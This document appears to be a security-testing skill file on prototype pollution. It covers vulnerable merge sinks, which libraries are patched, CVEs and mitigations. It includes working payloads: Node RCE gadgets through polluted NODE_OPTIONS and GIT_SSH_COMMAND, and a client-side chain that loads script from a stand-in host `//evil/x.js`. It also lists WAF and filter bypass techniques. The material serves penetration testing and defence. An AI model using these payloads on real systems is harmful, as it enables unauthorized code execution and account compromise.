---
name: prototype-pollution
description: Client and server prototype pollution testing — merge/set/parse sinks, guard differential (__proto__ / constructor.prototype / Object.create(null)), Node universal-gadget chains (child_process / require / import), and 2024–2026 CVE surface
---

# Prototype Pollution

Prototype pollution corrupts shared object prototypes (`Object.prototype`, `Array.prototype`, class prototypes) via a merge/set/parse sink that copies an attacker-controlled key onto the prototype chain. The primitive is: **inject one key on the shared prototype and every plain object thereafter behaves as if it had that key.** Downstream that reads polluted keys as config — auth flags, spawn env, template options, module paths — turns the pollution into logic bypass, DOM XSS, or Node.js RCE via a universal-gadget class documented in Silent Spring (USENIX Sec'23) and GHunter (USENIX Sec'24).

## Attack Surface

**Languages & Runtimes**
- JavaScript/TypeScript in the browser
- Node.js (server), Deno (universal gadgets in `Deno.*`/`Worker`/`fetch`/std-lib documented by GHunter)
- JSON, YAML, TOML parsers that preserve `__proto__`/`constructor`/`prototype` keys and hand them to a downstream merge

**Input Vectors**
- JSON request bodies, GraphQL variables, WebSocket / postMessage payloads
- URL-encoded nested objects — `qs`, `body-parser`, PHP-style array notation (`?__proto__[isAdmin]=true`)
- Multipart form fields with nested keys; header/cookie objects passed to config merges
- File imports (JSON/YAML config, lockfile fragments, package.json parsing)

**Vulnerable Patterns**
- Deep merge / extend / defaults / clone (`lodash.merge`, older `jQuery.extend(true, ...)`, custom recursive copy)
- Set-by-path (`lodash.set`, `set-value`, `dset`) with a dotted path containing `__proto__`
- Query parsers turning `__proto__[x]=y` / nested JSON into an object handed downstream
- Config/YAML merges that preserve prototype keys (legacy `js-yaml.load`, `nconf`, `config`)

## Key Vulnerabilities

### Pollution Mechanics

Measured on Node v24.19.0 (`.zen-batch-artifacts/batch8/prototype_pollution/measurements/01-merge-clone-matrix.output.txt`). These decide whether a candidate is real:

- **`JSON.parse` alone does not pollute.** `JSON.parse('{"__proto__":{"x":1}}')` creates an **own property named `__proto__`** on the result (`Object.hasOwn` is `true`); it does *not* set the prototype, so `({}).x` stays `undefined`. Pollution happens only when that parsed object is then walked by a **recursive merge/clone/defaults** that copies `__proto__`. The finding is the merge, not the parse — a raw echo of a `__proto__` key proves nothing.
- **Both `__proto__` and `constructor.prototype` work via a naive recursive merge.** A merge of `{"constructor":{"prototype":{"z":"Z"}}}` pollutes just as `{"__proto__":{...}}` does, so a filter blocking only `__proto__` is bypassed (measured: `({}).z === 'Z'`). Both classes propagate to `Object.prototype` because the naive merge recurses into `target[key]` and `target.__proto__` reads the current prototype (`Object.prototype`) via inheritance.
- **The guard differential is the whole game.** With `Object.prototype.isAdmin` polluted: `user.isAdmin` → `true`, `user?.isAdmin` → `true`, `'isAdmin' in user` → `true`, `user.isAdmin ?? 'x'` → `true`, `user.isAdmin || 'x'` → `true`, `for (k in user)` yields `isAdmin` (all **exploitable**). But `Object.hasOwn(user,'isAdmin')` → `false`, `.hasOwnProperty` → `false`, `Object.keys(user)` → `[]`, `Reflect.ownKeys(user)` → `[]`, `JSON.stringify(user)` → `"{}"`, and any `Object.create(null)` / `Map`-based check is `undefined` (all **safe**). The exploitable sinks are property reads, `in` checks, and `for..in` iteration; an app that gates on `Object.hasOwn` / null-proto containers is not. Look for `if (user.isAdmin)`, `opts.x || default`, `key in obj`, and `for (k in obj)` patterns downstream of the merge.
- **Direct `a.__proto__ = X` is scoped to `a`, not global.** `({}).hackedA` stays `undefined` after `a.__proto__ = {hackedA: true}`. The universal-pollution class requires a merge/set that *walks into* `__proto__` (or `constructor.prototype`); a straight assignment reassigns the target's own `[[Prototype]]` only. This is why devalue's `__proto__` vector (CVE-2025-57820) is per-instance-scoped rather than a classical global-prototype pollution — see the novel sibling for the primitive class.
- **Mitigations that actually stop it, measured:** `Object.create(null)` option objects (all inherited reads become `undefined`); key blocklists on `__proto__`/`constructor`/`prototype` at the parser layer (before the merge); `Map` instead of plain objects; and `node --disable-proto=throw` (measured: `a.__proto__ = X` throws `ERR_PROTO_ACCESS`; existing inheritance is not undone, so this hardens the accessor, not the class).

### The Modern Merge/Clone Landscape

Measured against the current-patched releases on Node v24.19.0 (`measurements/01-merge-clone-matrix.js`). The 2018–2020 vintage narrative that "lodash, hoek, deepmerge all pollute" is **stale on patched versions**. Current-release behavior:

| Library / API | Pollutes `Object.prototype`? | Notes |
|---|---|---|
| `JSON.parse` (no merge) | no | myth check — corroborates the measured finding above |
| `Object.assign`, spread `{...x}`, `structuredClone` | no | copy own props only; `__proto__` becomes an own key on the target |
| `lodash.merge/mergeWith/defaultsDeep` (4.17.21) | no | patched years ago; guard is in place |
| `lodash.set/setWith/zipObjectDeep` (4.17.21) | no | patched |
| `@hapi/hoek.merge/applyToDefaults` (v11) | no | patched |
| `deepmerge` (4.3.1) | no | patched |
| `deepmerge-ts` (5.1.0, post-CVE-2022-24802 fix) | no | patched — see novel for the pre-fix mechanism |
| `merge-options`, `deep-extend`, `merge-deep`, `mixin-deep`, `assign-deep` | no | current releases patched |
| `set-value` (4.1.0), `dset` (3.1.4) | no (throws safely on `__proto__`/`constructor`) | patched |
| `utils-extend@1.0.8` (**unpatched CVE-2024-57077**) | **yes via `__proto__`; not via `constructor.prototype`** | still shipping the pollution primitive |
| `devalue` pre-5.3.2 | no (Object.prototype); **yes per-instance** on reconstructed classes | CVE-2025-57820 — see novel |
| `devalue@5.3.2` | throws `Cannot parse an object with a __proto__ property` | fix commit `0623a47` |
| `canvg@4.0.3` / `3.0.11` | fixed | CVE-2025-25977 class-shape — see novel |
| `@messageformat/runtime@3.0.2` | fixed | CVE-2025-57353 class-shape — see novel |

Practical implication: on modern targets, the **pollution primitive** is almost never lodash/hoek — it is an app-specific merge, a still-unpatched niche package (utils-extend and its cousins), a legacy pinned version, or a custom `for (k in src) t[k] = s[k]` in the codebase. Grep for those before spraying JSON payloads at parsers whose merges are already hardened.

**Frontier-vs-history framing.** The 2024–2026 live prototype-pollution surface is genuinely narrower than the 2018–2023 historical literature (Silent Spring's 11 core-Node gadgets, GHunter's 123 across Node+Deno). Measurement corroborates this: mainstream merges are patched, the two Node core ACE gadgets (require, import(.mjs)) are fixed at v18.19.0, and only utils-extend@1.0.8 + niche cousins currently ship the pollution primitive on current-version scans. The historical gadget catalog remains load-bearing for legacy targets (Node <v18.19.0, unpatched-pinned utility libs) — `prototype_pollution_novel_deep.md` retains the full mechanism-decomposition for those paths. On a current-version target the reachable primitives are a much smaller subset than the literature enumerates.

### Client-Side Prototype Pollution

**Gadget effects**
- Bypass auth checks reading `user.isAdmin` when polluted on prototype (the guard differential above).
- DOM XSS via polluted properties consumed by `innerHTML`, `document.write`, `document.createElement('script').src`, or a script-loader reading `config.scriptSrc` from a global. Load `xss.md § DOM Clobbering` for the clobbering-adjacent variant where the polluted key names a global that flows into a sink.
- Cookie/session manipulation when the app reads config defaults from `opts.cookieName || ...` or `opts.storageKey || ...`.

**Payload shapes**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__.polluted": "yes"}
```

**URL-encoded (qs-style)**
```
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

**Gadget catalog reference.** BlackFan's `client-side-prototype-pollution` GitHub repository maps polluted keys to concrete DOM-XSS sinks in jQuery, Popper, Wistia, Google Tag Manager, Adobe DTM, Embedly, and dozens of other widely embedded libraries. Cross-reference the target's script list against that catalog before payload construction; a matching library on the page is a direct DOM-XSS gadget once the pollution primitive fires.

### Server-Side Prototype Pollution (Node.js)

**Common Sinks**
- `lodash.merge`, `lodash.defaultsDeep`, `deep-extend`, `merge-options` — **on unpatched pinned versions** (grep the lockfile; current releases are safe).
- Express/Fastify with query parsers accepting nested objects (`extended: true`).
- YAML `load()` (legacy js-yaml pre-4, or plain `load` variants elsewhere) with prototype-containing input.
- Custom `for (k in src) target[k] = src[k]` loops (grep the codebase — this is the dominant vulnerable pattern in bespoke config code).

**Universal-gadget class — the pollution → RCE lift.** Once `Object.prototype` carries an attacker key, any later code path in the runtime that reads that key as if it were legitimate option/config is a gadget. Silent Spring (USENIX Sec'23) enumerates 11 universal gadgets in Node.js core; GHunter (USENIX Sec'24) extends the baseline to 123 gadgets across Node and Deno. The five gadgets that drove 12 RCEs across a 5-year public-report review of Kibana, NPM CLI, Parse Server, and Rocket.Chat: `child_process.spawn` (via env or shell), `bson` (Parse Server), `lodash.template` (compiler options), `nodemailer` (transport opts), and `require` (main path). Load `prototype_pollution_novel_deep.md § Silent Spring & GHunter — Universal-Gadget Baseline` for the full mechanism decomposition.

Measured on Node v24.19.0 (`measurements/03-gadget-transitions.output.txt`), the two currently-reachable gadget shapes:

| Polluted key(s) | Sink that executes | Mechanism (measured) | Status on latest Node |
|---|---|---|---|
| `env` (contains `NODE_OPTIONS`, `GIT_SSH_COMMAND`, etc.) | any `child_process.spawn/exec/fork` call whose caller does `{env} = opts` and `{...process.env, ...env}` | polluted `env` inherited via prototype chain; spread copies OWN props onto child env; child inherits and reads it | **current** (NPM CLI `@npmcli/run-script/lib/make-spawn-args.js` still matches the shape; measured NODE_OPTIONS reaches child) |
| `main` | dynamic `require(<package>)` where the package's `package.json` lacks a `main` field | polluted `Object.prototype.main` was picked up by the CJS loader's `parsed.main` fallthrough | **fixed in Node v18.19.0** (measured on v24.19.0: fallthrough is gone, gadget no longer fires) |
| `source` | `import('.mjs file')` where the runtime module loader reads a `source` option | polluted `Object.prototype.source` executed as JS on any subsequent `.mjs` import | **fixed in Node v18.19.0** (measured on v24.19.0: original module content loads, not the polluted source) |
| `shell` + `input` (Windows) | `execSync`/`spawnSync` when caller doesn't set shell/input; polluted `shell='cmd.exe'` + `input='echo PWNED\n'` executes a piped command | BH Asia 2023 slide-deck primitive (Windows-specific) | Linux behavior differs: shell path honored, stdin `input` dropped unless explicitly passed by caller |

**RCE-gadget payload for the still-current env-spread path:**
```json
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/fd/0"}}}
```
Confirm the sink is actually reached (a real `spawn`/`exec` on the request path), not just that pollution succeeded — the gadget is version- and call-site-specific. The `NODE_OPTIONS=--inspect-brk=0.0.0.0:<port>` cross-platform CDP RCE also lands via the same env-spread path (BH Asia 2023, verified reachable in measurement) — the attacker then drives `Runtime.evaluate` over the CDP wire.

### 2024–2026 CVE Class-Shape Surface

Each of the following CVEs names a specific polluting function; version metadata and mechanism decomposition live in `prototype_pollution_novel_deep.md` per §2.

- **CVE-2025-25977** — canvg `StyleElement` constructor accepts a payload that pollutes when the SVG parser walks it. Route: `prototype_pollution_novel_deep.md § canvg CVE-2025-25977`.
- **CVE-2025-57353** — `@messageformat/runtime.addMessages()` insufficient validation of nested message keys allows pollution during message data processing. Route: `prototype_pollution_novel_deep.md § messageformat CVE-2025-57353`.
- **CVE-2025-57820** — `devalue.parse` accepts `__proto__` on reconstructed class instances AND fails to validate numeric array indices (Array.prototype method aliasing). Per-instance-scoped, not global. Route: `prototype_pollution_novel_deep.md § devalue CVE-2025-57820`.
- **CVE-2024-57077** — `utils-extend.extend()` recursive merge sink; **unpatched as of this writing** (no first_patched_version in the GHSA). Route: `prototype_pollution_novel_deep.md § utils-extend CVE-2024-57077`.
- **CVE-2022-24802** — `deepmerge-ts` `defaultMergeRecords()` in `deepmerge.ts`; the anchor for the pre-fix vs post-fix measurement differential. Route: `prototype_pollution_novel_deep.md § deepmerge-ts CVE-2022-24802 — Measurement Anchor`.

### Filter Bypasses

**Key-sanitization bypasses**
- **Constructor path when `__proto__` blocked** — `{"constructor":{"prototype":{"x":true}}}` reaches Object.prototype via the same naive-merge recursion (measured above).
- **Unicode / normalization** — full-width `__proto__` variants when the sanitizer runs before Unicode normalization but the parser normalizes after.
- **Dotted-path in set-by-path** — `{"__proto__.polluted":true}` reaches `set-value`/`dset` code paths on legacy unpatched builds.
- **Array shape** — `__proto__[0]`, `[].__proto__`; some parsers treat brackets as array coercion and skip the object-key filter.
- **MongoDB-operator collision** — JSON keys starting with `$` or containing `.` collide with NoSQL operator syntax. Load `nosql_injection.md` for that class; the intersection is a small sanitizer that blocks only `__proto__` and misses `$` operators / dotted paths.

**Parser-transport differentials** — a filter often runs on the JSON body but not on query-string bracket notation, or vice versa. Switch content-type and re-fire; if the two paths reach the same merge, the differential is direct-inject.

**Freeze/seal gaps** — pollution *before* `Object.freeze(Object.prototype)` is loaded; pollution affecting newly created objects because the freeze was on an instance, not the prototype; and libraries that internally `Object.create(null)` for options but not for state.

### Framework-Specific Surface Notes

The general-vuln file names the shape; framework files own the framework-specific expression per §8 Option B:

- **Express / Fastify** — `qs` with default `parseArrays: true` accepts `?__proto__[x]=y`; `body-parser` with `extended: true` similarly. See `express-safe-query-parser` and the framework files for hardened options.
- **Next.js / Nuxt / Astro** — SSR data hydration blobs deserialized on the server can carry `__proto__` if the deserializer is unhardened; the risk lives at the client-boundary component that reads `props.x || default` from the hydrated tree.
- **Deno** — the universal-gadget baseline is *larger* than Node's per GHunter. Deno-specific gadgets live in `Deno.Command`, `Deno.run`, `Deno.open`, `Deno.writeFile`, `Worker.env`/`ffi`/`net`/`read`/`run`/`write`, `fetch`, plus the `std/dotenv`, `std/json`, `std/log`, `std/tar`, `std/yaml` clusters. Load the novel sibling for the gadget-by-name treatment.

### Second-Order and Delayed Pollution

The merge does not have to fire on the request path; the finding is any code path that copies attacker-controlled keys into an object graph consumed later. High-yield second-order channels:

- **Persistence → export pipeline** — attacker writes a JSON blob to a user profile, notes field, or metadata store; a nightly export/report merges the blob into a template context and the pollution fires on the render worker.
- **Background job queue** — attacker submits a job whose payload is a JSON `data` object; the worker deserializes and merges into a job-context object using `_.defaultsDeep(defaults, payload)`; if the worker pinned an old lodash, the pollution fires off the request path (and per-worker, not per-request — pollution persists for the worker's lifetime).
- **CI/CD lockfile / package.json parsing** — a compromised or attacker-authored `package.json` fragment with `__proto__` keys is parsed and merged by a build script; the pollution fires in the build agent's Node process, not the deployed app.
- **Log ingestion / SIEM pipeline** — attacker sends a JSON log line with prototype keys; an aggregator merges log entries into a rollup document; the pollution fires in the log-pipeline worker.
- **Config reload** — attacker plants a payload in a config source the app reloads (S3, git repo, etcd); the reload merges the polluted config into the running defaults.

Confirmation for the delayed path: place a unique canary in the persisted blob, wait for the pipeline to run, then probe a downstream endpoint that reads the same prototype key. The primitive is the same; only the trigger is deferred.

## Confirmation Discipline

Prototype-pollution findings fail most often because the tester confused three separate states. The discipline: what does the observed evidence *actually prove*.

- **Parse-echo alone** — request contains `{"__proto__":{"canary":"yes"}}` and the response contains `"canary":"yes"` in an echoed dump of the request body. This proves the parser preserved the key as an own property; it proves **nothing** about pollution. Object.hasOwn on the parsed object is `true`; the prototype is untouched.
- **Pollution confirmed** — send a canary payload to endpoint A, then issue an *unrelated* request to endpoint B that reads a prototype-inherited key or iterates `for..in` over a fresh object. If endpoint B reflects the canary, pollution reached `Object.prototype`. This is the pollution proof.
- **Sink confirmed** — with pollution confirmed, demonstrate that a specific downstream code path *reads* the polluted key in a security-sensitive operation. An auth-flag polluted but never read is not the finding; a template compile that consumes `outputFunctionName` is. This is the impact proof.

Report all three states separately when they differ (a common shape: pollution confirmed on a shared multi-worker server, but the sink lives in a code path the current worker never hits — the finding is real for other workers, not this one).

## Chains

Prototype pollution is a **capability transfer** node in an attack graph. Its preconditions and postconditions:

**Upstream (what grants the pollution primitive):**
- **Reachable merge/set sink with a `__proto__` or `constructor.prototype` payload** — any of the sinks in `§ Pollution Mechanics`. Grep target for the merge functions and their call sites.
- **Parser preserves prototype keys** — `JSON.parse` does; `qs` with defaults does; `body-parser` with `extended:true` does. If the parser strips them first, the merge never sees them.
- **Second-order channels** — see the section above; the merge can fire off the request path.

**Downstream (what pollution grants):**
- **Auth/authz bypass** → the finding is on this file's `xss.md`-style guard-differential list (`user.isAdmin` / `role`).
- **DOM XSS** → routes to `xss.md § DOM Clobbering` when the polluted key names a global consumed by a script loader; routes to `xss.md § Client-Side Template Injection` when the polluted key flows into a template compile.
- **Server-side RCE (Node)** → routes to the universal-gadget class in `prototype_pollution_novel_deep.md § Silent Spring & GHunter — Universal-Gadget Baseline`. The env-spread gadget is current on Node 24; the require/import gadgets are dead post-v18.19.0 (measured).
- **Template SSTI** → routes to `ssti.md` when polluted `outputFunctionName`/`escapeFunction` flows into `ejs.render`, `pug.compile`, or `handlebars.compile`.
- **Deno emerging-stack RCE** → routes to `prototype_pollution_novel_deep.md § Deno Universal-Gadget Catalog` for `Deno.Command`, `Worker.*`, `std/*`.
- **NoSQL operator injection collision** → routes to `nosql_injection.md` when the sanitizer blocks `__proto__` but the JSON body also carries `$`-prefixed operator keys.

**Composite chains, end-to-end (routed by filename):**
- *Query-string pollution → template SSTI:* `qs`/`body-parser` accepts `?__proto__[outputFunctionName]=...` → `ejs.render` picks up polluted `outputFunctionName` → template compiles attacker JS. Route: `prototype_pollution_novel_deep.md § ejs / pug / handlebars — Template Compile Gadgets` then `ssti.md`.
- *JSON body pollution → NPM CLI env-spread → git RCE:* JSON body with `{"__proto__":{"env":{"GIT_SSH_COMMAND":"..."}}}` hits `parse-conflict-json`/similar merge → `Object.prototype.env` set → any `spawn` call whose caller does `{...process.env, ...env}` inherits GIT_SSH_COMMAND → next git spawn executes attacker command. Route: `prototype_pollution_novel_deep.md § NPM CLI End-to-End Chain`.
- *Pollution → CDP RCE:* pollute `Object.prototype.env.NODE_OPTIONS = '--inspect-brk=0.0.0.0:<port>'` → next Node child-process spawn opens CDP debugger → attacker connects and drives `Runtime.evaluate`. Route: `prototype_pollution_novel_deep.md § child_process — Cross-Platform NODE_OPTIONS CDP Gadget`.
- *Persisted-blob → export-pipeline pollution → template RCE:* attacker writes profile bio containing `__proto__` payload → nightly PDF export deserializes and merges into template context → pollution fires in export worker → template compile executes attacker JS. Route: `§ Second-Order and Delayed Pollution` above.
- *Client-side pollution → DOM XSS via loader:* pollute `Object.prototype.scriptSrc` via URL fragment / `#__proto__[scriptSrc]=//evil/x.js` when the router uses `qs`-style hash parsing → script loader reads `config.scriptSrc || default` → attacker JS loads under the origin. Route: `xss.md § DOM Clobbering`.

Chain hops are reachability/enablement only — each hop's actual firing depends on the target's version pins, sink presence, and configuration.

## Testing Methodology

1. **Identify merge points** — grep the source for `merge`, `extend`, `defaults`, `defaultsDeep`, `assign`, `set(...)`, `dset(...)`, `_.set`, `Object.assign` in a loop, and any `for (k in x) t[k] = x[k]`.
2. **Baseline probe** — inject a benign pollution marker into every JSON/form/nested-query candidate parameter:
   ```json
   {"__proto__": {"pollutionCanary_ab7f": "yes"}}
   ```
   Confirm the marker by issuing a second, unrelated request and inspecting response fields, error messages, or observable state (a rendered flag, a template default) for `pollutionCanary_ab7f`. Do NOT rely on the request echoing `__proto__` — that is the parse-echo, not pollution.
3. **Shape variants** — retry with `constructor[prototype]`, bracket-notation (`?__proto__[key]=value`), dotted-path (`{"__proto__.pollutionCanary":"yes"}`), and array shape.
4. **Channel matrix** — same parameter across JSON body, form-URL-encoded, multipart, WebSocket message, GraphQL variable. Differential between channels reveals which parser is unhardened.
5. **Gadget hunting (Node.js)** — with pollution confirmed, map polluted key to sink: enumerate `node_modules` and grep for `child_process`, `ejs`/`pug`/`handlebars` compile, `require`/`import()` on dynamic paths, `nodemailer`, `bson`. Match Node version against the require/import v18.19.0 boundary.
6. **Client-side** — check whether polluted properties affect routing decisions (`route.name || default`), auth UI (`user.isAdmin`), or DOM sinks (loader `config.scriptSrc`). Cross-reference BlackFan's client-side-prototype-pollution catalog against the target's script list.

## Validation

1. Demonstrate a property on `Object.prototype` affecting behavior on **unrelated** objects (the canary + a follow-up request on a different endpoint is the cleanest evidence).
2. Show security impact: auth bypass with the polluted flag, template XSS via polluted compile options, or a real spawn/require/import reading the polluted key. A canary alone is a *pollution* proof — the *finding* is what the app does with it.
3. Prove pollution persists across requests (server) or page lifetime (client) as applicable. On multi-worker servers, pollution is per-worker unless the merge fires in a shared code path.
4. Document exact merge function, input path (parameter name, content-type), and downstream sink (file:line if source-available).
5. Confirm fix: null-prototype option objects (`Object.create(null)`), key blocklists at the parser, `Map` instead of `{}`, patched library version, or `--disable-proto=throw` on the runtime.

## False Positives

- Parser strips `__proto__` before merge — marker never appears on prototype (echo in the response is not the finding).
- Framework uses `Object.create(null)` for options objects throughout — inherited reads yield `undefined`, so the sink never fires.
- Polluted key visible in a JSON echo but never merged into the object graph (the parse-echo trap).
- Client-side pollution on a page whose loader was freeze-hardened (`Object.freeze(Object.prototype)` at bootstrap) — measured no behavioral change on the actual gadget.
- WAF blocks the direct payload but alternate encodings/content-types are also blocked consistently (record as WAF-effective, not app-safe).
- Modern-lodash target — `_.merge` on 4.17.21 does not pollute (measured); a candidate that only sprays `_.merge` payloads at a modern-version target proves nothing.

## Bypass Methods

- Switch from `__proto__` to `constructor[prototype]` when only one is filtered.
- Array notation: `__proto__[key]`, `[].__proto__.key`, `__proto__[0][x]` — parsers vary in how they coerce.
- Content-type switching: JSON vs `application/x-www-form-urlencoded` vs multipart vs GraphQL variable; a WAF often watches only one path.
- Split pollution across multiple parameters merged sequentially by the app.
- Second-order: store the payload in a persistence layer, trigger the merge in a background job or export pipeline (the merge is what fires; the write does not).
- Dotted-path variant when the app uses `set-by-path`: `{"__proto__.polluted":"yes"}`.
- Unicode/normalization mismatch between the WAF and the parser.
- Reach the merge via a code path the WAF is not fronting (internal admin API, worker queue, cron pipeline).

## Impact

- Authentication and authorization bypass via polluted flag checks (`user.isAdmin`, `role`, `permissions`).
- DOM XSS via polluted `config.scriptSrc` / loader defaults; template XSS via polluted compile options.
- Remote code execution on Node.js through the universal-gadget class — env-spread into `child_process`, require path (pre-v18.19.0), CDP debugger via NODE_OPTIONS (cross-platform), Windows shell+input pipe.
- Denial of service via polluting widely read prototype properties (`.length`, `.toString`, iteration-related keys).

## Pro Tips

1. Always verify pollution with a unique canary key (`pollutionCanary_<random>`) on an **unrelated** follow-up request before attempting RCE gadgets. Echoed `__proto__` in the request-response cycle is not the finding.
2. Match the target Node version against the require/import v18.19.0 fix boundary — those two gadgets are dead on newer Node. The env-spread gadget survives.
3. In white-box scans, grep for `merge`, `extend`, `defaultsDeep`, `assign`, and *any* `for (k in x) t[k] = s[k]` in the codebase — bespoke merges are the dominant vulnerable pattern once mainstream libraries patched.
4. Match `node_modules` against installed versions, not against the CVE catalog alone — a package with a CVE but a patched version pinned is not the finding.
5. Check both request parsing and downstream config merges (second-order pollution in export/report pipelines).
6. On Deno targets, expand the gadget catalog beyond the Node subset — `Deno.*`, `Worker.*`, `fetch`, and `std/*` are all in-scope per GHunter.
7. If the app uses `devalue`, `structured-clone` polyfills, or bespoke serializers, test for per-instance-scoped prototype override (not just global) — the CVE-2025-57820 shape overrides methods on the reconstructed object without polluting `Object.prototype`.
8. Combine with client-side template injection if polluted keys flow into rendering config — the intersection with `xss.md § Client-Side Template Injection` is a common chain.

## Tooling

Detection is mostly about payload shapes (above) plus a couple of light helpers. The sandbox has `go` and `nuclei`; `ppfuzz` is a single static binary.

- **ppfuzz** (dwisiswant0) — fast client-side prototype-pollution fuzzer (Rust, single binary); good for spraying the URL/param shapes across many endpoints:
  ```bash
  ppfuzz -l urls.txt
  ```
- **nuclei** (preinstalled) — has prototype-pollution templates for quick triage:
  ```bash
  nuclei -u https://target -tags prototype-pollution
  ```
- **DOM Invader** (Burp, GUI) — client-side pollution + gadget-scan; the fastest way to find PP-to-XSS gadgets when a browser GUI is available.
- **BlackFan `client-side-prototype-pollution`** — not a tool but the canonical **gadget reference**: maps polluted keys to concrete DOM-XSS sinks per library. Use it to turn a confirmed pollution into real impact.

For server-side gadget hunting there is no reliable one-click tool — enumerate `node_modules` in white-box scope, match Node version to the require/import fix boundary, and map polluted keys to sinks (`child_process` `env`/`shell`/`NODE_OPTIONS`, `ejs`/`pug` `outputFunctionName`, `nodemailer` transport opts) as covered above.

## Summary

Any unsafe recursive merge, set-by-path, or bespoke `for (k in src) t[k] = s[k]` that copies a `__proto__` or `constructor.prototype` key is the pollution primitive; the finding is the downstream sink that lifts a polluted key into a security-sensitive operation. Confirm with an unrelated-object canary — echoed `__proto__` proves nothing. Block `__proto__`/`constructor`/`prototype` at the parser, use `Object.create(null)` for option objects, prefer `Map`, and match the target's Node version against the require/import v18.19.0 fix boundary before claiming an RCE.
